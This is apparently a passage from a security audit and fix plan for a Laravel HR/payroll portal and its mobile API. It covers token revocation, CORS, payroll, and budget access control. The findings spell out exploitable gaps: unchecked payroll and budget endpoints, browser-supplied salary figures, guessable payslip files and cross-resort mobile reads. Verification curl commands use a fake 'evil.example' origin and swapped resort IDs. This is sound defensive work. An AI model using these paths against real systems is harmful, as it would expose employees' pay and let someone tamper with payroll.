4. Add the resort-status check to the mobile login.
5. Use the same "Account is deactivated" message and response shape for every blocked case (don't reveal *which* status blocked it).

**VERIFY:** tinker (transaction, rolled back), with a real employee and password (or set a known password inside the transaction):
| Case (set inside transaction) | Expected mobile login result | Expected web login result |
|---|---|---|
| employee `Active`, admin `active`, resort `active` | success | success |
| employee `Terminated` | blocked | blocked |
| employee `Resigned` | blocked | blocked |
| employee `Suspended` | blocked | blocked |
| admin `inactive` (lowercase, as the form saves it) | blocked | blocked |
| resort `inactive` | blocked | blocked |
Call `apiLogin` / the web login method directly with the harness pattern and paste the filled table.

---

### S4-03 · MEDIUM · Changing your password logs out only the current phone

**Where:** `API/ProfileController.php:389-390`. After a successful password change it does `$employee->token()->revoke()`, which revokes **only the token used for this request**. Up to 4 other live tokens (other phones, an old tablet, **or whoever stole the password**) stay valid.

**Why it matters:** "change my password" is exactly what a user does when they suspect someone else has their account. Today that doesn't lock the other person out.

**Fix:** revoke **all** of the user's tokens: `$employee->tokens()->update(['revoked' => true]);`, the same as the forgot-password flows already do. (The current request's token is included, so the app must send the user back to login, which it already does today because the current token is revoked.) `HUMAN`/Ankit: also check any portal action where **HR resets an employee's password** and apply the same rule there (`grep -rn "Hash::make" app/Http/Controllers/Resorts | grep -i password`).

**VERIFY:** tinker (transaction, rolled back): create 3 tokens for one user (`$admin->createToken('t1')` ×3), call the change-password method with one of them as the current token, then `$admin->tokens()->where('revoked', false)->count()` → `0`. Paste it.

---

### S4-04 · MEDIUM · Mobile tokens last one year  ·  ✅ DECIDED: 90 days (Option A)

**Where:** no `Passport::personalAccessTokensExpireIn(...)` call anywhere in `app/Providers`, so Passport's default of **1 year** applies (`vendor/laravel/passport/src/Passport.php:324`). Tokens are personal access tokens (`LoginController.php:119`, `createToken('ResortAdminToken')`), which have **no refresh token**. A shorter lifetime means users have to type their password again when it runs out.

**Why it matters:** a stolen phone or copied token stays usable for up to a year. After S4-01/S4-03 this matters less (leavers and password changes are handled), which is why it's MEDIUM and a product decision.

**Options (Ankit + product owner choose, and record the choice here):**
- **A (simple):** `Passport::personalAccessTokensExpireIn(now()->addDays(90));` in `AppServiceProvider::boot()`. Users log in again every 90 days. The mobile app must treat a `401` as "go to login" (check it already does).
- **B (better UX, more work):** switch to Passport's password grant with refresh tokens: short access tokens (e.g. 1 day), long refresh tokens (e.g. 90 days), and the app refreshes silently. Needs mobile-app changes.
- Recommended: **A now**, B later if users complain.

**✅ DECIDED by the product owner (2026-09-26): Option A, 90 days.** Staff will have to enter their password again every 90 days; that trade-off is accepted. Implement exactly `Passport::personalAccessTokensExpireIn(now()->addDays(90));` in `AppServiceProvider::boot()`. **Existing tokens** were issued with a one-year expiry, which the new setting doesn't shorten. `HUMAN` decides whether to cut them to 90 days with a one-off **migration** (`UPDATE oauth_access_tokens SET expires_at = LEAST(expires_at, created_at + INTERVAL 90 DAY) WHERE revoked = 0`). Recommended: yes, so the rule applies to everyone from day one.

**VERIFY:**
```bash
php artisan tinker --execute="echo now()->diffInDays(now()->add(\Laravel\Passport\Passport::personalAccessTokensExpireIn()));"
```
Expected: `90` (or `89`/`90` depending on the clock).
- Log in through the mobile login endpoint (`POST /api/login`) on staging, then check the newest `oauth_access_tokens` row for that user: `expires_at` ≈ `created_at` + 90 days. Paste both timestamps.
- Mobile app check (`HUMAN`, staging only): temporarily change the lifetime to `now()->addMinutes(2)` on the staging server, log in on a test phone, wait 3 minutes, reopen the app. It must go to the login screen cleanly (no crash, no endless spinner). Then set it back to 90 days. (No manual DB edits, per CLAUDE.md invariant #1.)

---

## 6. STAGE 5 — CORS

**Correction to an earlier chat claim:** CORS was described as "allowing every origin". The config file says so, but **the setting is dormant**:
- `config/cors.php` has `'allowed_origins' => ['*']`, but **no `paths` key**.
- Laravel's `HandleCors` middleware (registered at `app/Http/Kernel.php:20`) only adds CORS headers when the request path matches `cors.paths`. With no paths, it **never adds any CORS headers** (`vendor/laravel/framework/src/Illuminate/Http/Middleware/HandleCors.php`, `hasMatchingPath()` returns `false`).
- Nothing else in `app/`, `config/`, `routes/`, `public/.htaccess` or `public/web.config` sets `Access-Control-Allow-*` headers.
- Result: browsers apply the normal same-origin rule, and **other websites can't read this app's responses**. That's the safe state. The mobile app isn't affected, since CORS is a browser-only rule.

### S5-01 · LOW · CORS config is dormant but misleading

**Why it's still listed:** the file *looks* wide open, and the obvious "fix" if someone needs CORS for one thing is to add `'paths' => ['*']`. That would instantly apply `allowed_origins: *` to the whole app. Worse, if someone also sets `supports_credentials => true`, Laravel's CORS handling **echoes back whatever origin asks**, which lets **any website read logged-in portal pages using the victim's session cookie**. That would be a full cross-site data leak.

**Fix:** make the file say what's actually intended:
```php
'paths' => [],                                  // no browser cross-origin access needed today
'allowed_origins' => [],                        // add exact origins only when a real need appears
'allowed_origins_patterns' => [],
'supports_credentials' => false,               // never true together with a wildcard origin
```
Add a one-line comment at the top: "Mobile app doesn't need CORS. Only add explicit https origins here, never '*', never with supports_credentials=true."

**VERIFY:**
```bash
php -r '$c = require "config/cors.php"; var_export([$c["paths"] ?? null, $c["allowed_origins"], $c["supports_credentials"]]);'
```
Expected: `array ( 0 => array ( ), 1 => array ( ), 2 => false, )`
```bash
# HUMAN, against production (checks the web server doesn't add CORS headers either):
curl -s -D - -o /dev/null -H 'Origin: https://evil.example' https://<prod-domain>/api/login -X OPTIONS | grep -i '^access-control-allow'
curl -s -D - -o /dev/null -H 'Origin: https://evil.example' https://<prod-domain>/resort/ | grep -i '^access-control-allow'
```
Expected: *(no output)* for both. If an `Access-Control-Allow-Origin` header **does** appear, it's coming from nginx/Apache or a CDN. Find and remove it; that would be a real finding.
## 7. STAGE 6 — Module-by-module sweep

Each module is checked for four things:
1. **Tenant isolation** — can resort A read or change resort B's records?
2. **Role access** — inside one resort, can someone see or do more than their role should allow (see X-01)?
3. **XSS** — is text a user typed printed back as raw HTML?
4. **Uploads** — are file types checked, and are files stored through `StorageHelper` in a safe place?
5. **Acting as someone else** *(added 2026-09-26 at the product owner's request)* — can a user make the server act **as, or on behalf of, a different person** by changing an ID or a "who is acting" field in the request (e.g. `emp_id`, `employee_id`, `sender_id`, `action_by`, `approver_id`), instead of the server using the logged-in user? Can they **see another person's** personal data (same resort or another) just by changing an ID?

**How the tenant-isolation check was done (so it can be repeated):** a script lists every query that looks up a record by an ID (`find()`, `findOrFail()`, `where('id', …)`, `whereIn('id', …)`, `where('<x>_id', $request…)`) and flags each **statement** that has no `resort_id` in it. Every flagged line was then **traced by hand**. Most turned out to be scoped another way (through a parent record already checked against the resort, or `whereHas('employee', resort_id)`). Only real problems are listed below.

---

### 7.1 Payroll

**Scope audited:** `app/Http/Controllers/Resorts/Payroll/` (all 9 controllers: `PayrollController`, `PayslipController` incl. Final Settlement, `CasualPayrollController`, `ConfigController`, `DashboardController`, `EWTController`, `PensionController`, `ShopkeeperController`, `PaymentConsentController`), salary advances and repayments (`app/Http/Controllers/Resorts/People/Employee/AdvanceSalaryController.php`, `AdvanceSalaryRepaymentTrackerController.php`), payroll reports (`PayrollReportController.php`, `SalaryAdvanceLoanReportController.php`), mobile (`app/Http/Controllers/API/PayrollController.php`, salary-advance/guarantor methods in `API/RequestController.php`), the payroll import jobs (`app/Jobs/Import*Job.php`, `app/Imports/*`), and views under `resources/views/resorts/payroll/`. **124 web routes + 10 mobile routes.**

**Good news first — tenant isolation in Payroll is clean.** 97 ID lookups were flagged by the script, and **every one** traced back to a resort check. Ankit's earlier hardening held across payroll runs, reviews, approvals, payslips, final settlements, salary advances, repayments, shopkeepers, payment consent and all mobile endpoints. **Don't re-audit these for cross-resort access.** The payroll problems are **inside** a resort: who can see and change salaries.

---

#### P-01 · HIGH · Anyone with a portal login can see every salary and run/change payroll  ·  ✅ DECIDED: HR + Finance only

**What it is:** because of X-01, only **11 of the 124** payroll routes are listed in `module_pages` (`payroll.run`, `payroll.dashboard`, `payroll.configration`, `payroll.ewt.index`, `payroll.pension.index`, `payroll.final.settlement`, `final.settlement.list`, `people.advance-salary.index`, `people.advance-salary-repayment-tracker.index`, `resort.casualPayroll.index`, `shopkeepers.create`). Those are the **menu pages**. The endpoints that actually return or change the data aren't listed, so they're open to **every logged-in portal user in the resort**. `PayrollController` (66 methods), `ConfigController`, `DashboardController`, `EWTController`, `PensionController` and `PaymentConsentController` contain **no permission checks** of their own.

**What any portal user (e.g. a line supervisor with portal access) can do today:**

| Action | Route → method |
|---|---|
| **See every employee's full payroll** (basic, allowances, OT, service charge, deductions, net) | `GET payroll/data/{id}` → `getPayrollData`; `GET payroll/view/{id}` → `viewPayroll` |
| **Download / export the whole payroll** | `GET payroll/download/{id}` → `downloadPayroll`; `GET payroll/export-review/{id}/{type}` → `exportReview` |
| **See anyone's payslip / email it to them** | `POST payroll/payslip/view` → `viewPayslip` + `GET payslip/show`; `POST payroll/payslip/share` |
| **Build and edit a payroll run** | `POST payroll/save-draft`, `save-employees`, `save-attendance`, `save-attendance-note`, `save-service-charges`, `save-deductions`, `save-reviews`, `save-summary`, `send-for-approval` |
| **Change pay configuration for everyone** (earning/deduction types, cutoff day, bulk imports) | `POST payroll/earnings/submit`, `payroll/deductions/submit`, `PUT/DELETE payroll/deductions/{id}`, `POST payroll/import-earnings`, `import-deductions`, `import-service-charges`, `save-cutoff-day` |
| **Create / submit final settlements** (leaver pay-outs) | `POST final-settlement/store`, `final-settlement/submit` |

**Also confirmed:**
- **Final Settlement's own permission checks do nothing.** `PayslipController.php:400, 756, 1325` call `checkRouteWisePermission('payslip.finalsettlement', …)`, but **no route has that name**. An unknown route is treated as "unlisted", so the check **always passes**.
- **Payroll reports**: `PayrollReportController` and `SalaryAdvanceLoanReportController` check the generic `resort.report.index` permission, then narrow by `Common::getScopedDepartmentIds()`. That helper (`app/Helpers/Common.php:5624`) gives **every non-HR employee their whole department**, whatever their rank. `Common::hasFullDataAccess()` (`:5559`) also gives **L&D / Training managers** (`'Training Director', 'L&D Manager', 'Learning & Development Head'`) **full access**, which in payroll reports means **every salary in the resort**. That rule was written for L&D data, not payroll.
- **What is correctly protected:** payroll **approval** (`approvePayroll`, `PayrollController.php:1304+`: only Finance EXCOM → HR EXCOM → GM, in order, resort-scoped); salary-advance **approval** (`AdvanceSalaryController::updateStatus`, `:539+`: HR / Finance / GM checked on the server, with delegation); the mobile payslip endpoints (always the caller's own payslip).

**✅ DECIDED by the product owner (2026-09-26) — who may access payroll:**
- **Full payroll access (view, run, configure, final settlements): HR and the Finance department only.**
  - HR = the HR department, as `Common::getEmployeeRankPosition()` resolves it (department "Human Resources"/"HR"), plus rank 3 (HR).
  - Finance = the Finance department, as `getEmployeeRankPosition()` resolves it (department "Finance"/"Accounting").
  - Master admin (the resort's system owner account) keeps access for administration.
- **GM: no payroll access** (see the open point below about GM *approvals*).
- **HODs / EXCOM of every other department: no payroll access at all**, not even their own department's totals.
- **Everyone else, including L&D managers: no payroll access.** They see only their **own** payslip (mobile app / own profile).

**✅ DECIDED by the product owner (2026-09-26) — GM keeps the final-approver role (option (a) below).** The GM is currently the **final approver** in three flows, and **stays** the final approver in all three:
- payroll run: Finance EXCOM → HR EXCOM → **GM** (`PayrollController.php:1482-1489`, `getApprovalStepForUser`)
- final settlement: HR EXCOM → Finance EXCOM → **GM** (`PayslipController.php:908-910`, `:980`)
- salary advance / loan: HR → Finance → **GM** (`AdvanceSalaryController.php:735+`)

"No payroll access" for the GM would have blocked these at the last step, so the two options were:
- **(a) ✅ CHOSEN — GM approves only.** The GM can open **only** the specific payroll, final settlement or advance that is **waiting for the GM's approval**, read-only, and approve or reject it. No payroll menu, no browsing other payrolls or payslips, no running, editing or configuring.
- **(b) Rejected — remove the GM from the approval chains.** Payroll and final settlement end after the HR EXCOM / Finance EXCOM steps, and salary advances end at Finance. That changes the business process and needs code changes in all three flows.

So: **the approval chains stay exactly as they are** (Finance → HR → GM for payroll runs, HR → Finance → GM for final settlements, HR → Finance → GM for salary advances). The GM loses everything else in payroll: menu, browsing, payslips, running, editing, configuring, reports.

**Fix:**
1. Add **one** helper, e.g. `Common::canAccessPayroll($employee = null): bool`, that returns `true` only for HR and Finance as defined above (plus master admin). Build it on `getEmployeeRankPosition()`. **Don't** reuse `hasFullDataAccess()`: it lets in the GM and L&D managers, which the decision excludes. Don't change `hasFullDataAccess()` itself either, because other modules depend on it.
2. Call it at the top of **every** method in `PayrollController`, `ConfigController`, `DashboardController`, `EWTController`, `PensionController`, `CasualPayrollController`, `PaymentConsentController`, the payslip + final-settlement methods of `PayslipController`, and the payroll/salary-advance report methods. Return `403` JSON for AJAX, `abort(403)` for pages. **Keep** the existing, stricter approval-step checks in `approvePayroll` / `approveFinalSettlement` / `AdvanceSalaryController::updateStatus`; the new gate goes *in front of* them, not instead of them.
3. Replace the three `checkRouteWisePermission('payslip.finalsettlement', …)` calls with the new helper.
4. In the two report controllers (`PayrollReportController`, `SalaryAdvanceLoanReportController`), gate every method with the new helper. Non-HR/Finance users (HODs, EXCOM, GM, L&D) get `403`, **not** a department-filtered view.
5. GM approval (decided, option (a)): let the three approval endpoints (`approvePayroll`, `approveFinalSettlement`, `AdvanceSalaryController::updateStatus` with `action_by=gm`) and the **one** read-only view needed to review the item awaiting approval through for the GM, **only when** that item's pending approval step is the GM's. Everything else returns `403` to the GM.
6. Payroll-related menu entries should be hidden for users the helper rejects (frontend), so they don't click into `403` pages. Hiding a menu is **not** the protection, though: the server-side gate in steps 2-4 is.

**VERIFY:** pick users of **one** resort: (a) HR, (b) a Finance-department user, (c) the GM, (d) a HOD/EXCOM of another department (e.g. F&B), (e) an L&D manager if the resort has one, and (f) a rank-4+ ordinary portal user. For **each** route in the table above, plus the payroll report routes, call it through the §0.5 harness pattern (same resort) and paste a table: `Route | HR | Finance | GM | other HOD | L&D | ordinary`. Expected: HR and Finance succeed; **GM, other HOD, L&D and ordinary users all get `403`**; nothing changes in the DB for any `403` row (compare `payroll_review` / `payroll` row counts and `updated_at` before and after). Separately: with a payroll in `pending_approval` at step 3, the GM **can** open that payroll's approval view and approve it (option (a)). Also confirm users (d), (e) and (f) can still see **their own** payslip in the mobile app.
```bash
grep -n "payslip.finalsettlement" app/Http/Controllers/Resorts/Payroll/PayslipController.php
```
Expected: *(no output)*

---

#### P-02 · HIGH · Payroll figures are taken from the browser and can be changed after approval

**Where:**
- `PayrollController::saveReviewsToPayroll()` (`:1002-1125`) writes each employee's `earned_salary`, `earnings_basic`, `earnings_normal`, `earnings_allowance`, every allowance line, all overtime figures, `service_charge`, `service_provider_commission` and `total_deductions` **exactly as the browser sends them** in `reviewData[]`, then computes `net_salary` from those numbers (`:1036-1060`). The server doesn't recompute them from attendance, allowances or the benefit grid.
- **None** of the `save*` endpoints check the payroll's status before writing: `saveEmployeesToPayroll` (`:471`), `saveAttendanceToPayroll` (`:546`), `saveAttendanceNote` (`:647`), `saveServiceChargesToPayroll` (`:772`), `saveDeductionsToPayroll` (`:900`), `saveReviewsToPayroll` (`:1002`), `saveSummaryToPayroll` (`:1160`), `sendForApproval` (`:1262`). Statuses in use: `draft` → `locked` (`:1189`) → `pending_approval` (`:1293`) → `approved` (`:1393`), or back to `draft` on rejection (`:1365`).
- `saveDraftPayroll` (`:381+`) finds the payroll for the same resort, category and dates with `updateOrCreate` and **sets its status to `draft`**. It only refuses when a `locked` one exists (`:430-437`), so a payroll that is **`pending_approval` or already `approved` gets pushed back to `draft`**.

**Why it matters:** combined with P-01, any portal user can open DevTools and raise their own (or anyone's) `earned_salary` in `reviewData[]`, **even after Finance, HR and the GM have approved** the payroll. The approved totals the approvers saw no longer match what's stored. Even after P-01 is fixed, a payroll user can still change an approved payroll by mistake, or on purpose, with no audit trail. For a payroll system this is a **financial-integrity** finding that auditors look for specifically.

**Fix:**
1. Add one private guard in `PayrollController`, e.g. `assertPayrollEditable(Payroll $payroll)`, that refuses (`422`, "This payroll is locked/awaiting approval/approved and can no longer be changed") unless `$payroll->status === 'draft'`. Call it in **every** `save*` method and `sendForApproval` right after the existing resort-scoped payroll lookup. `saveSummaryToPayroll` is the step that moves `draft → locked`, so it must also refuse unless the status is `draft`.
2. In `saveDraftPayroll`, refuse (instead of resetting) when the matching payroll's status is anything other than `draft`. Treat `locked`, `pending_approval` and `approved` the same.
3. In `saveReviewsToPayroll`, **recompute** the money fields on the server from the already-saved attendance, allowances, service charge and deductions for that payroll + employee (the same calculation the review screen's JavaScript does today), and ignore the client values. Keep accepting only genuinely manual inputs (if any exist, e.g. a manual adjustment field), and log them with who and when. If a full server-side recompute is too big for this pass, the **minimum** is: after step 1, compare the client figures with a server recompute and reject differences above a small rounding tolerance.
4. Record every change to a non-draft payroll attempt in the existing payroll activity log (`payroll_attendance_activity_log` / `showActivityLog`) so there's an audit trail.

**VERIFY:**
- Tinker (transaction, rolled back): take an `approved` payroll of resort A. As an HR user of A, call `saveReviewsToPayroll` with `payroll_id` = that payroll and one `reviewData` row with `earnedSalary` = original + 1000 → expect `422`, and `PayrollReview` for that employee **unchanged**. Repeat with a `pending_approval` payroll and a `locked` payroll → `422` both.
- Same test calling `saveDraftPayroll` with that approved payroll's resort, category and dates → `422`, and `Payroll::find(id)->status` is still `approved`.
- Draft control: on a `draft` payroll, send `earnedSalary` inflated by 1000 → the stored value equals the **server-computed** value, not the inflated one (or the request is rejected, if the minimum version of step 3 was chosen). Paste before/after values.
- Normal flow still works end to end on staging: create a draft → fill all steps → save summary (locks) → send for approval → approve ×3 → `approved`.

---

#### P-03 · MEDIUM · Mobile payslip PDFs saved with guessable names in one shared folder, never deleted

**Where:** `API/PayrollController::downloadPayslip()` — `API/PayrollController.php:805-807`:
```php
$relativePath = trim(config('settings.PayslipPdf'), '/') . '/' . time() . '_payslip.pdf';   // uploads/payslip/<unix-second>_payslip.pdf
StorageHelper::put($relativePath, $pdf->output());
$pdfUrl = StorageHelper::temporaryUrl($relativePath);
```

**Why it matters:**
1. **Same-second collision:** the name is only the current second, with no resort, employee or random part. At month-end, when many staff open their payslip at once, two employees in the same second write to the **same file**, and one of them gets a link to the **other person's payslip** (full salary breakdown).
2. **Guessable, permanent links on local-disk servers:** on Wasabi (production), `temporaryUrl` is signed and expires after 30 minutes. But `StorageHelper::temporaryUrl()` (`app/Helpers/StorageHelper.php`) returns a **plain public URL** when the disk isn't cloud. On any server running with local disk (staging, test, a fallback), anyone can walk `…/uploads/payslip/<timestamp>_payslip.pdf` second by second and download **everyone's** payslips.
3. **Never deleted:** every download leaves another salary document in storage forever.

**Fix:** don't store the PDF at all. Stream it straight back (`return $pdf->download('Payslip_<month>_<year>.pdf')`) if the mobile app can accept a file response. If the app needs a URL, store under `payslips/<resort_id>/<employee_id>/<Str::uuid()>.pdf`, return the signed URL, and delete it after a short time (a scheduled cleanup of files older than 1 hour). `HUMAN`: check with the mobile developer which of the two the app supports. `HUMAN`: delete the existing files under `uploads/payslip/` on every server and bucket.

**VERIFY:**
```bash
grep -n "time() . '_payslip.pdf'" app/Http/Controllers/API/PayrollController.php
```
Expected: *(no output)*
- Tinker: call `downloadPayslip` for two different employees back to back in the same second (loop without sleeping). The two returned URLs/paths must be different, and each PDF must contain its own employee's name.

---

#### P-04 · LOW · Import files kept forever on local disk; one unscoped deductions read

| Where | Issue | Fix |
|---|---|---|
| `Payroll/ConfigController.php:67, 99, 131` | Uploaded pay-component spreadsheets saved with raw `$file->storeAs('imports', …)` (default local disk, not `StorageHelper`, against invariant #2) and only deleted when the import **fails**. Successful imports stay on disk forever. The extension allow-list is based on the client file name only. | Delete the file after a successful import too (or read it from the upload's temp path without storing it). Add `mimes:csv,xls,xlsx,ods` to the validator. |
| `PayrollController.php:2637-2639` (inside `fetchTimeAttendance`) | `PayrollDeduction::where('payroll_id', $request->payrollId)` has no resort check. Impact is minimal: results are only merged into **this** resort's employee rows by key. It's the one unscoped read left in payroll. | Add a `Payroll::where('id', $request->payrollId)->where('resort_id', $resortId)->exists()` check before it (the same check the method already does in its other branches at `:2060-2064`). |

**VERIFY:** after a successful import, `storage/app/imports/` doesn't contain the new file. `sed -n 2630,2645p app/Http/Controllers/Resorts/Payroll/PayrollController.php` shows the ownership check before the `PayrollDeduction` query.

---

#### Payroll — XSS and uploads: checked and found clean
- The `{!! !!}` outputs in payroll views (`payslip/final_settlement_review.blade.php`, `dashboard/dashboard.blade.php`, `dashboard/drafts.blade.php`) all print `Common::formatCurrency(<number>)`, so no user text reaches them.
- Raw DataTable columns in payroll (`PayrollController.php:371, 3623`, `PayslipController.php:131, 1415`, `PensionController.php:275, 418`, `AdvanceSalaryController.php:177`, `AdvanceSalaryRepaymentTrackerController.php:125`) build HTML from employee names, departments, positions and fixed status badges, all HR-controlled. No free text typed by employees was found in them. (Keep in mind for the People module: if employees can ever edit their own name, these become XSS.)
- Payroll has no other upload paths besides the three imports in P-04.

#### Payroll — non-security bug noticed (backlog)
| File:line | Bug |
|---|---|
| `routes/resort_route.php:1817` | `people/advance-salary-repayment-tracker/update-status` points to `AdvanceSalaryRepaymentTrackerController@updateStatus`, **which doesn't exist**. Any button using this route fails with a 500. |

---

### 7.2 Manning & Budgeting (Workforce Planning)

**Scope audited:** `app/Http/Controllers/Resorts/BudgetController.php` (5,372 lines), `ManningController.php` (divisions, departments, sections, positions), `ManningResponseController.php` (department manning requests / budgets), `BudgetCostController.php`, `NonpermanentBudgetCostController.php`, `ConsolidateBudgetController.php`, `OccupancyController.php`, `PositionConfigController.php`, `WorkforcePlanningDashboardController.php`, `WorkforcePlanningReportController.php`, the "Send to Finance / GM" step in `ResortAllNotificationController::SendToFinance()` (`:323`), mobile `app/Http/Controllers/API/ManningController.php` + `API/BudgetCostController.php`, and views in `resources/views/resorts/{budget,budgetcost,manning,workforce_planning,Positions}/`. **84 web routes + 5 mobile routes.**

**Why this module matters:** a manning budget holds **every employee's current basic salary and proposed salary**, per month, plus the resort's cost structure (allowances, benefits, overtime rates). It's nearly as sensitive as payroll.

**Intended process (from `resources/views/resorts/budget/consolidated.blade.php:135-153` and `SendToFinance()`):** each HOD fills in their **own department's** manning request → HR reviews and sends it to Finance → Finance sends it to the GM → **the GM approves**. The "Send to Finance / Send to GM" step is **correctly** restricted on the server to HR / Finance / GM (`ResortAllNotificationController.php:332`). The steps below aren't.

**Tenant isolation on the web side is clean** (68 lookups flagged by the script, all traced): every web endpoint that takes a `{resortId}` in the URL or `resort_id` in the form **replaces or verifies it** against the logged-in user (`BudgetController::viewConsolidatedBudget`, `getConfiguration`, `saveBudgetCostAssignment`; `ManningResponseController::store`, `saveDraft`, `getDraft`). The only cross-resort leak is on the **mobile** side (W-01).

---

#### W-01 · HIGH · Mobile app: any employee can read another resort's budget costs and org structure

**Where:** all five endpoints take the resort **from the query string** and never compare it with the caller's own resort:

| Route (`routes/api.php`) | Method | Returns for **any** resort id passed |
|---|---|---|
| `GET resort/budget-costs` (`:43`) | `API/BudgetCostController::getBudgetCosts` (`:15-31`) | **The whole budget-cost table**: every cost item's title, particulars, **amount**, cost type, frequency and details. This is the resort's confidential compensation / cost structure. |
| `GET resort/positions` (`:40`) | `API/ManningController::getPositions` (`:153`) | Every position (title, code, rank, department, benefit-grid level, category) |
| `GET resort/departments` (`:38`) | `API/ManningController::getDepartments` (`:52`) | Every department |
| `GET resort/sections` (`:39`) | `API/ManningController::getSections` (`:101`) | Every section |
| `GET resort/divisions` (`:37`) | `API/ManningController::getDivisions` (`:18`) | Every division |

The routes sit inside `auth:api` (`routes/api.php:24`), so the attacker needs **any** employee login in **any** resort, and then just changes `?resort_id=`. Resort IDs are small sequential numbers. For the international client, this means **its staff could read other clients' cost structures, and other clients' staff could read its own.**

**Fix:** in all five methods, ignore the query parameter and use the caller's resort: `$resortId = $this->user->resort_id;` (or `Auth::guard('api')->user()->resort_id`). Keep accepting `resort_id` in the request only so the mobile app doesn't break, but **don't use it**. If it's present and differs from the caller's resort, return `403`. Remove the `exists:resorts,id` validation, which confirms to an attacker which resort IDs exist.

**VERIFY:** with a mobile token for an employee of resort A (tinker: `$t = $adminA->createToken('t')->accessToken;` inside a transaction, or a staging login), call each of the five routes with `?resort_id=<resort B's id>`:
```bash
curl -s -H "Authorization: Bearer $T" -H "Accept: application/json" "https://<staging>/api/resort/budget-costs?resort_id=<B>" | head -c 300
```
Expected for **all five**: `403`, or data belonging to **resort A only** (check that every returned row's `resort_id` is A). Paste the five results. Then `?resort_id=<A>` → still works (the app keeps working).

---

#### W-02 · HIGH · Anyone with a portal login can approve a department budget, or all budgets for the year  ·  ✅ DECIDED: GM only

**Where:**
- `BudgetController::approveBudget()` (`:3013`, route `POST /budget/approve`, `resort.budget.approve`): marks one department's manning budget `Approved`, writes an `Approved` `BudgetStatus` row, notifies HR and the HOD.
- `BudgetController::approveAllDepartmentBudgets()` (`:3128`, route `POST /budget/approve-all`, `resort.budget.approveAll`): marks **every department's budget for the year** `Approved` in one call.

Both are resort-scoped (only the caller's resort), but **neither checks the caller's role**. The only thing stopping a HOD, supervisor or any portal user is that the **Approve button is hidden** unless the user is the GM (`consolidated.blade.php:145-153`). Anyone can send the same request from DevTools. Neither route is listed in `module_pages` (X-01).

**Why it matters:** the budget approval is the GM's sign-off on next year's headcount and salary spend. It unlocks hiring against the budget, and the approval PDF (`downloadBudgetApprovalPdf`, `:3202`) is used as evidence of approval. A forged approval undermines that control.

**Fix:** at the top of both methods, add the same style of check `SendToFinance()` already uses (`ResortAllNotificationController.php:326-334`, check at `:332`):
```php
$pos = Common::getEmployeeRankPosition($this->resort->getEmployee);
if (($pos['position'] ?? null) !== 'GM') {
    return response()->json(['success' => false, 'message' => 'Only the GM can approve budgets.'], 403);
}
```
**✅ DECIDED by the product owner (2026-09-26): only the GM approves budgets**, for both single-department approval (`approveBudget`) and approve-all (`approveAllDepartmentBudgets`). HR, Finance, HODs and everyone else get `403` on both. Also check the budget is actually at the GM stage (`budget_process_status === 'GM'`) before approving, so an approval can't skip the HR → Finance steps.

**VERIFY:** §0.5 harness, same resort: call `approveBudget` and `approveAllDepartmentBudgets` as (a) a HOD, (b) HR, (c) Finance, (d) the GM, each on a budget that is at the GM stage. Expected: (a), (b), (c) → `403` and `budget_process_status` unchanged; (d) → success. Also as the GM on a budget still at the **HR** stage → refused. Paste the results table.

---

#### W-03 · HIGH · Salary-level budget data readable and editable by any portal user  ·  ✅ DECIDED

**What it is:** the budget screens themselves (`ViewBudget`, `ConsolidateBudget`, `ViewManning`, `CompareBudget`) do check rank. But the **data endpoints behind them** have **no role or department check**, only a resort check. Any portal user can call them directly:

| Endpoint (route) | Method (`BudgetController.php` unless noted) | What it exposes / changes |
|---|---|---|
| `GET budget/hierarchy/position/employees` | `getPositionEmployees` (`:3748`) | Every employee in a position with **current basic salary and budgeted salary** |
| `GET budget/hierarchy/employee/monthly` | `getEmployeeMonthlyData` (`:3957`) | One employee's **month-by-month salary + allowance + overtime budget** |
| `GET budget/hierarchy/vacant/monthly`, `budget/hierarchy/department`, `budget/hierarchy/all-totals` | `getVacantMonthlyData` (`:4149`), `getDepartmentHierarchy` (`:3659`), `getAllBudgetTotals` (`:4293`, department filter only) | Budget for vacancies, whole-department and whole-resort totals |
| `POST budget/hierarchy/employee/update`, `budget/hierarchy/vacant/update` | `updateEmployeeMonthlyBudget` (`:4599`), `updateVacantMonthlyBudget` (`:4824`) | **Change** any employee's budgeted salary figures |
| `POST resorts/{resortId}/budget/save-cost-assignment`, `…/get-configuration` | `saveBudgetCostAssignment` (`:3255`), `getConfiguration` (`:3542`) | Change / read which cost items apply to each employee |
| `POST budget/upload/config-files`, `budget/resort-all-department-wise` | `UploadconfigFiles` (`:2845`), `UpdateResortBudgetPositionWise` (`:2945`) | Replace budget configuration for the whole resort |
| `GET budget/{budgetId}/approval-pdf` | `downloadBudgetApprovalPdf` (`:3202`) | The signed approval PDF |
| `GET budget/export` | `ConsolidateBudgetController::ExportBudget` | **Excel export of the whole consolidated budget** |
| `/budget/cost/*`, `/budget/cost/nonpermanent/*` | `BudgetCostController`, `NonpermanentBudgetCostController` (no permission checks) | Create / edit / delete the resort's cost items (allowances, benefits, rates) |
| `/store-occupancy`, `/store-import-datas`, `/store-bulk-occupancy` | `OccupancyController` (no permission checks) | Change the occupancy forecast that drives staffing numbers |

**✅ DECIDED by the product owner (2026-09-26) — who may access manning & budgets** (the recommended default below was accepted as-is):
- **HR and Finance:** full access (view all departments, edit, configure costs, export).
- **GM:** view the consolidated budget and approve (W-02). The GM doesn't edit figures.
- **HODs / EXCOM:** **only their own department's** manning request and budget (fill in, save draft, submit, view). No other department, no resort-wide totals, no cost configuration, no export.
- **Everyone else, including L&D managers:** no access.

**Fix (after the decision):**
1. Add one helper, e.g. `Common::budgetAccessLevel($employee = null): string` returning `'full'` (HR, Finance), `'approve'` (GM), `'own_department'` (HOD/EXCOM of other departments) or `'none'`. Build it on `Common::getEmployeeRankPosition()`, the same source `SendToFinance()` uses. **Don't** reuse `hasFullDataAccess()` / `getScopedDepartmentIds()` for this: the first includes L&D managers, and the second gives every ordinary employee their whole department.
2. Gate every method in the table: `'none'` → `403`; `'own_department'` → allowed only when the requested department/position/employee belongs to the caller's own `Dept_id`; `'approve'` → read-only consolidated view + W-02 approval; `'full'` → everything.
3. `BudgetCostController`, `NonpermanentBudgetCostController`, `OccupancyController`, `UploadconfigFiles`, `UpdateResortBudgetPositionWise`, `ExportBudget`: `'full'` only.

**VERIFY:** users of one resort: HR, Finance, GM, HOD of department X, HOD of department Y, an ordinary portal user. For each endpoint in the table, paste `Endpoint | HR | Finance | GM | HOD-X on X | HOD-X on Y | ordinary`. Expected: matches the decided rules. For every `403` row, the related `resort_employee_budget_cost_configurations` / `position_monthly_data` / `resort_budget_costs` rows are unchanged.

---

